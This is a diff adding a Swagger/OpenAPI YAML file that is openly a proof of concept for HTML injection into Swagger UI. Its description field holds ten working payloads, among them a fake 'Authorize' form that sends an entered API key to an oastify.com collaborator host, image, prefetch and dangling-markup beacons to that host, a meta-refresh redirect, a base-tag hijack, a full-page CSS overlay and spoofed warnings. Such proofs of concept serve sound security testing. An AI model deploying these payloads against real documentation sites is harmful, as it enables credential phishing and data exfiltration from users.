@@ -1,0 +1,70 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: HTML Injection PoC
+  description: '
+    <h2>HTML Injection Impact Vectors</h2>
+
+    <hr>
+    <h3>Vector 1 - External Resource Load (IP Disclosure)</h3>
+    <p>If this image loads, the server receives the users IP and User-Agent:</p>
+    <img src="https://c5iqas7z9j1i05xeekchvel4lvrmfc31.oastify.com/swagger-html-injection" width="1" height="1">
+
+    <hr>
+    <h3>Vector 2 - Meta Redirect (Open Redirect)</h3>
+    <meta http-equiv="refresh" content="5;url=https://example.com">
+    <p>If meta tags render, the page redirects after 5 seconds.</p>
+
+    <hr>
+    <h3>Vector 3 - CSS Overlay (Full Page Hijack)</h3>
+    <style>
+    .swagger-ui .topbar { display: none !important; }
+    .swagger-ui .information-container { position: fixed !important; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; background: white; margin: 0; padding: 40px; }
+    .swagger-ui .scheme-container, .swagger-ui .opblock-tag-section { display: none !important; }
+    </style>
+    <p>If style tags render, the entire Swagger UI is hidden and replaced with this content only.</p>
+
+    <hr>
+    <h3>Vector 4 - Link Injection (External Navigation)</h3>
+    <a href="https://example.com" style="color:blue;font-size:18px;">Click here to re-authenticate (session expired)</a>
+
+    <hr>
+    <h3>Vector 5 - Base Tag Hijack</h3>
+    <base href="https://example.com/">
+    <p>If base tag renders, all relative links on the page now point to attacker domain.</p>
+
+    <hr>
+    <h3>Vector 6 - Form Action Hijack</h3>
+    <p>If the Authorize button exists, this form sits above it:</p>
+    <form action="https://c5iqas7z9j1i05xeekchvel4lvrmfc31.oastify.com/collect" method="GET">
+    <label>API Key: </label><input type="text" name="apikey" style="padding:5px;border:1px solid #ccc;">
+    <button type="submit" style="padding:5px 15px;background:#4990e2;color:white;border:none;cursor:pointer;">Authorize</button>
+    </form>
+
+    <hr>
+    <h3>Vector 7 - Dangling Markup (Attribute Injection)</h3>
+    <img src="https://c5iqas7z9j1i05xeekchvel4lvrmfc31.oastify.com/leak?content=
+
+    <hr>
+    <h3>Vector 8 - Link Prefetch / Preload</h3>
+    <link rel="prefetch" href="https://c5iqas7z9j1i05xeekchvel4lvrmfc31.oastify.com/prefetch-test">
+    <link rel="preload" href="https://c5iqas7z9j1i05xeekchvel4lvrmfc31.oastify.com/preload-test" as="image">
+
+    <hr>
+    <h3>Vector 9 - Picture Source (SSRF test)</h3>
+    <picture><source srcset="https://c5iqas7z9j1i05xeekchvel4lvrmfc31.oastify.com/ssrf-picture"><img src="https://c5iqas7z9j1i05xeekchvel4lvrmfc31.oastify.com/ssrf-img"></picture>
+
+    <hr>
+    <h3>Vector 10 - Table-based Content Spoofing</h3>
+    <table style="width:100%;border-collapse:collapse;">
+    <tr style="background:#f8d7da;"><td style="padding:15px;color:#721c24;border:1px solid #f5c6cb;text-align:center;font-size:16px;"><strong>WARNING: This API version is deprecated. Migrate to v3 immediately.</strong></td></tr>
+    </table>
+
+    '
+paths:
+  /:
+    get:
+      summary: Test endpoint
+      responses:
+        '200':
+          description: OK
